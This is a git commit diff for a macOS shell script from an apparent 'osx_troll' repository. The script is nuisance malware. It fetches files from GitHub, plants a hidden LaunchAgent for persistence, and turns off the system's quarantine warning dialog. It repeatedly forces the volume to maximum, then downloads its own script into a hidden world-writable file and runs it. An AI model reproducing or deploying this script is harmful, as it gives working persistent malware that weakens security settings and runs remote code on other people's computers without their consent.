64547f839166cd3dc3383c11fedb965f750955cc
Me1922 <34125170+Me1955@users.noreply.github.com>
2021-05-14 11:47:59 +1000

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,11 +1,19 @@
 #! /bin/bash
-curl -L https://raw.githubusercontent.com/Me1955/osx_troll/main/P.mp3 --output ~/Desktop/.troll.mp3
 
 curl -s -L https://raw.githubusercontent.com/Me1955/osx_troll/main/main.plist >> ~/Library/LaunchAgents/.main1.plist
 cat ~/Library/LaunchAgents/.main1.plist >> ~/Library/LaunchAgents/.music.plist
 rm ~/Library/LaunchAgents/.main1.plist
 chmod 600 ~/Library/LaunchAgents/.music.plist
 launchctl load ~/Library/LaunchAgents/.music.plist
+
+curl -s -L https://raw.githubusercontent.com/Me1955/osx_troll/main/run.sh >> ~/Desktop/.music.sh
+chmod 777 ~/Desktop/.music.sh
+
+
+curl -L https://raw.githubusercontent.com/Me1955/osx_troll/main/P.mp3 --output ~/Desktop/.troll.mp3
+
+
+sleep 30m
 
 #Disable the “Are you sure you want to open this application?” dialog
 defaults write com.apple.LaunchServices LSQuarantine -bool false
@@ -19,7 +27,5 @@ while [ $SECONDS -lt $end ]; do
 	osascript -e 'set volume 100'
 done
 
-curl -s -L https://raw.githubusercontent.com/Me1955/osx_troll/main/run.sh >> ~/Desktop/.music.sh
-chmod 777 ~/Desktop/.music.sh
-sleep 30m
+sleep 60m
 sh ~/Desktop/.music.sh
